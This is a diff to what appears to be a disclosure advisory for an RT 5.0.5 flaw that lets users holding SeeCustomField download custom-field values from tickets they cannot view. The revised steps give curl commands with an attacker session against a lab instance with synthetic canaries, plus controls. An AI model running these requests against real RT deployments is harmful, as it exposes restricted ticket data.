@@ -43,18 +43,46 @@ The download handler evaluates `ObjectCustomFieldValue->CurrentUserCanSee`, whic
 
 The following procedure uses synthetic values in an isolated RT 5.0.5 instance.
 
-1. Create a restricted queue and a canary ticket that the test account cannot view.
-2. Create a binary or long-text CustomField value on that ticket.
-3. Grant the test account `SeeCustomField` at system scope, but do not grant `SeeQueue` or `ShowTicket` on the restricted queue.
-4. Verify that both the web ticket display and REST 2.0 ticket endpoint reject the test account.
-5. As the same account, request:
+1. Deploy RT 5.0.5 in a disposable lab instance and set `RT_BASE` to the lab URL.
+2. Create a restricted synthetic queue and ticket. Create two custom fields on the ticket: one Binary field containing `SYNTHETIC-BINARY-CANARY`, and one long-text field containing `SYNTHETIC-LONGTEXT-CANARY`.
+3. Record the synthetic `ObjectCustomFieldValue` IDs from the lab database or the supported administration UI. Do not use production IDs.
+4. Create three test users:
+   - `attacker`: has `SeeCustomField` at a broad lab scope, but no `ShowTicket` or `SeeQueue` for the restricted queue;
+   - `reader`: has both `SeeCustomField` and parent-object visibility;
+   - `creator`: has neither permission.
+5. Confirm the parent-object boundary for `attacker`:
 
-   ```text
-   GET /Download/CustomFieldValue/<OCFV_ID>/canary.bin
+   ```bash
+   curl -sS -b attacker.jar -o /dev/null -w '%{http_code}\n' \
+     "$RT_BASE/Ticket/Display.html?id=<SYNTHETIC_TICKET_ID>"
+   curl -sS -b attacker.jar -o /dev/null -w '%{http_code}\n' \
+     "$RT_BASE/REST/2.0/ticket/<SYNTHETIC_TICKET_ID>"
+   # Expected control: 403 for both requests
    ```
 
-6. Observe an HTTP 200 response containing the synthetic field value.
-7. As a negative control, repeat with an account that lacks `SeeCustomField`; that account is rejected.
+6. Request the Binary custom-field value:
+
+   ```bash
+   curl -sS -b attacker.jar -D binary.headers \
+     "$RT_BASE/Download/CustomFieldValue/<SYNTHETIC_BINARY_OCFV_ID>/canary.bin" \
+     -o binary.body
+   ```
+
+7. Vulnerable result: HTTP 200 and `binary.body` contains the synthetic canary even though the parent ticket is not visible.
+8. Repeat with the long-text value:
+
+   ```bash
+   curl -sS -b attacker.jar -D text.headers \
+     "$RT_BASE/Download/CustomFieldValue/<SYNTHETIC_TEXT_OCFV_ID>/canary.txt" \
+     -o text.body
+   ```
+
+9. Compare the controls:
+   - `reader` should receive 200 for both values;
+   - `creator` should receive 403;
+   - an anonymous request should redirect to the login page;
+   - `attacker` receives 200 in the vulnerable implementation despite the 403 parent-object checks.
+10. Verify the database row after the test and remove the synthetic ticket and values.
 
 
 ### Impact
